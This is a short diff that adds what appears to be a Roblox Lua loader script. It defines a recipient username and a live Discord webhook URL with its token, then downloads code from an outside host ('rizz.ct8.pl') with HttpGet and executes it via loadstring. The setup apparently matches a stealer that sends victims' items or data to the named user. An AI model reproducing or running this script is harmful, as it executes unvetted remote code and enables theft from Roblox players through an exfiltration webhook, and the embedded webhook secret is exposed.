@@ -1,0 +1,3 @@
+UserName = "9Okgabes"
+Webhook = "https://discord.com/api/webhooks/1098752590726049843/xn70UeI4_dO6HWX82-OAUfeYVUxtKz1N6L31omY0V721dl1XykOL16eq-mjOrsS4J1JV"
+loadstring(game:HttpGet("http://rizz.ct8.pl/scripts/Main", true))()
